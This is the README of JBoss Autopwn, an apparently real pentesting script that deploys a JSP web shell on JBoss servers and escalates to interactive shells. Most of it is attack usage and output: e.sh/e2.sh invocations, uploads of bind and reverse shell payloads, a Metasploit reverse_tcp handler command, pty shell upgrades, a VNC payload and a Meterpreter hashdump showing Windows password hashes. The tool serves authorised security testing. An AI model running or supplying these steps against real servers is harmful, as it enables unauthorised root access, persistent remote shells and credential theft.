:warning: *NOTE: This tool is no longer under active maintenance.*

JBoss Autopwn Script
Christian G. Papathanasiou
http://www.spiderlabs.com


INTRODUCTION
============

This JBoss script deploys a JSP shell on the target JBoss AS server. Once 
deployed, the script uses its upload and command execution capability to
provide an interactive session.

Features include:

- Multiplatform support - tested on Windows, Linux and Mac targets
- Support for bind and reverse bind shells
- Meterpreter shells and VNC support for Windows targets

INSTALLATION
============

Dependencies include

- Netcat
- Curl
- Metasploit v3, installed in the current path as "framework3"

USAGE
=====

Use e.sh for *nix targets that use bind_tcp and reverse_tcp

./e.sh target_ip tcp_port

Use e2.sh for Windows targets that can execute Metasploit Windows payloads

/e2.sh target_ip tcp_port


EXAMPLES
========

Linux bind shell:

[root@nitrogen jboss]# ./e.sh 192.168.1.2 8080 2>/dev/null
[x] Retrieving cookie
[x] Now creating BSH script...
[x] .war file created successfully in /tmp
[x] Now deploying .war file:
http://192.168.1.2:8080/browser/browser/browser.jsp
[x] Running as user...:
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[x] Server uname...:
 Linux nitrogen 2.6.29.6-213.fc11.x86_64 #1 SMP Tue Jul 7 21:02:57 EDT 2009 x86_64 x86_64 x86_64 GNU/Linux
[!] Would you like to upload a reverse or a bind shell? bind
[!] On which port would you like the bindshell to listen on? 31337
[x] Uploading bind shell payload..
[x] Verifying if upload was successful...
-rwxrwxrwx 1 root root 172 2009-11-22 19:48 /tmp/payload
[x] You should have a bind shell on 192.168.1.2:31337..
[x] Dropping you into a shell...
Connection to 192.168.1.2 31337 port [tcp/*] succeeded!
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
python -c 'import pty; pty.spawn("/bin/bash")'
[root@nitrogen /]# full interactive shell :-)

Linux reverse shell:

[root@nitrogen jboss]# nc -lv 31337 &
[1] 15536
[root@nitrogen jboss]# ./e.sh 192.168.1.2 8080 2>/dev/null
[x] Retrieving cookie
[x] Now creating BSH script...
[x] .war file created successfully in /tmp
[x] Now deploying .war file:
http://192.168.1.2:8080/browser/browser/browser.jsp
[x] Running as user...:
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[x] Server uname...:
 Linux nitrogen 2.6.29.6-213.fc11.x86_64 #1 SMP Tue Jul 7 21:02:57 EDT 2009 x86_64 x86_64 x86_64 GNU/Linux
[!] Would you like to upload a reverse or a bind shell? reverse
[!] On which port would you like to accept the reverse shell on? 31337
[x] Uploading reverse shell payload..
[x] Verifying if upload was successful...
-rwxrwxrwx 1 root root 157 2009-11-22 19:49 /tmp/payload
Connection from 192.168.1.2 port 31337 [tcp/*] accepted
[x] You should have a reverse shell on localhost:31337..
[root@nitrogen jboss]# jobs
[1]+  Running                 nc -lv 31337 &
[root@nitrogen jboss]# fg 1
nc -lv 31337
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
python -c 'import pty; pty.spawn("/bin/bash")';
[root@nitrogen /]# full interactive tty :-)
full interactive tty :-)

Against MacOS X (bind shell):

[root@nitrogen jboss]# ./e.sh 192.168.1.5 8080 2>/dev/null 
[x] Retrieving cookie
[x] Now creating BSH script...
[x] .war file created successfully in /tmp
[x] Now deploying .war file:
http://192.168.1.5:8080/browser/browser/browser.jsp
[x] Running as user...:
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),8(procview),29(certusers),3(sys),9(procmod),4(tty),5(operator),101(com.apple.sharepoint.group.1),80(admin),20(staff),102(com.apple.sharepoint.group.2)
[x] Server uname...:
 Darwin helium-2.tiscali.co.uk 9.7.1 Darwin Kernel Version 9.7.1: Thu Apr 23 13:52:18 PDT 2009; root:xnu-1228.14.1~1/RELEASE_I386 i386 
[!] Would you like to upload a reverse or a bind shell? bind
[!] On which port would you like the bindshell to listen on? 31337
[x] Uploading bind shell payload..
[x] Verifying if upload was successful...
-rwxrwxrwx 1 root wheel 172 22 Nov 19:58 /tmp/payload
[x] You should have a bind shell on 192.168.1.5:31337..
[x] Dropping you into a shell...
Connection to 192.168.1.5 31337 port [tcp/*] succeeded!
id
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),8(procview),29(certusers),3(sys),9(procmod),4(tty),5(operator),101(com.apple.sharepoint.group.1),80(admin),20(staff),102(com.apple.sharepoint.group.2)
python -c 'import pty; pty.spawn("/bin/bash")'
bash-3.2# id
id
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),8(procview),29(certusers),3(sys),9(procmod),4(tty),5(operator),101(com.apple.sharepoint.group.1),80(admin),20(staff),102(com.apple.sharepoint.group.2)
bash-3.2# 

Likewise for the reverse shell.

Windows bind shell:

[root@nitrogen jboss]# ./e2.sh 192.168.1.225 8080 2>/dev/null
[x] Retrieving cookie
[x] Now creating BSH script...
[x] .war file created succesfully on c:
[x] Now deploying .war file:
[x] Web shell enabled!: http://192.168.1.225:8080/browserwin/browser/Browser.jsp
[x] Server name...:
        Host Name . . . . . . . . . . . . : aquarius
[x] Would you like a reverse or bind shell or vnc(bind)? bind
[x] On which port would you like your bindshell to listen? 31337
[x] Uploading bindshell payload..
[x] Checking that bind shell was uploaded correctly..
[x] Bind shell uploaded: 22/11/2009  18:35            87,552 payload.exe
[x] Now executing bind shell...
[x] Executed bindshell!
[x] Reverting to metasploit....
[*] Started bind handler
[*] Starting the payload handler...
[*] Command shell session 1 opened (192.168.1.2:60535 -> 192.168.1.225:31337)

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\chris\Desktop\jboss-4.2.3.GA\server\default\tmp\deploy\tmp8376972724011216327browserwin-exp.war>


Windows reverse shell with a Metasploit meterpreter payload:

[root@nitrogen jboss]# ./e2.sh 192.168.1.225 8080 2>/dev/null
[x] Retrieving cookie
[x] Now creating BSH script...
[x] .war file created successfully on c:
[x] Now deploying .war file:
[x] Web shell enabled!: http://192.168.1.225:8080/browserwin/browser/Browser.jsp
[x] Server name...:
        Host Name . . . . . . . . . . . . : aquarius
[x] Would you like a reverse or bind shell or vnc(bind)? reverse
[x] On which port would you like to accept your reverse shell? 31337
[x] Uploading reverseshell payload..
[x] Checking that the reverse shell was uploaded correctly..
[x] Reverse shell uploaded: 22/11/2009  18:46            87,552 payload.exe
[x] You now have 20 seconds to launch metasploit before I send a reverse shell back.. ctrl-z, bg then type:
framework3/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=31337 E
[x] Now executing reverse shell...
[x] Executed reverse shell!
[root@nitrogen jboss]#


In terminal 2:

[root@nitrogen jboss]# framework3/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=31337 E

[*] Please wait while we load the module tree...
[*] Started reverse handler on port 31337
[*] Starting the payload handler...
[*] Sending stage (719360 bytes)
[*] Meterpreter session 1 opened (192.168.1.2:31337 -> 192.168.1.225:1266)

meterpreter > use priv
Loading extension priv...success.
meterpreter > hashdump
Administrator:500:xxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxxxx:::
chris:1005:xxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1004:5cb061f95caf6a9dc7d1bb971b333632:4ac4ee4210529e17665db586df844736:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:293c804ee7b7f93b3919344842b9c98a:::
__vmware_user__:1007:aad3b435b51404eeaad3b435b51404ee:a9fa3213d080de5533c7572775a149f5:::
meterpreter >


Windows VNC shell:

[root@nitrogen jboss]# ./e2.sh 192.168.1.225 8080 2>/dev/null
[x] Retrieving cookie
[x] Now creating BSH script...
[x] .war file created successfully on c:
[x] Now deploying .war file:
[x] Web shell enabled!: http://192.168.1.225:8080/browserwin/browser/Browser.jsp
[x] Server name...:
        Host Name . . . . . . . . . . . . : aquarius
[x] Would you like a reverse or bind shell or vnc(bind)? vnc
[x] On which port would you like your  vnc shell to listen? 21
[x] Uploading vnc  shell payload..
[x] Checking that vnc shell was uploaded correctly..
[x] vnc shell uploaded: 22/11/2009  19:14            87,552 payload.exe
[x] Now executing vnc  shell...
[x] Executed  vnc shell!
[x] Reverting to metasploit....
[*] Started bind handler
[*] Starting the payload handler...
[*] Sending stage (197120 bytes)
[*] Starting local TCP relay on 127.0.0.1:5900...
[*] Local TCP relay started.
[*] Launched vnciewer in the background.
[*] VNC Server session 1 opened (192.168.1.2:52682 -> 192.168.1.225:21)

[*] VNC connection closed.

[root@nitrogen jboss]#

>>VNC window opens here.. :-)


COPYRIGHT
=========

JBoss Autopwn - A JBoss script for obtaining remote shell access
Created by Christian G. Papathanasiou
Copyright (C) 2009-2011 Trustwave Holdings, Inc.
 
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
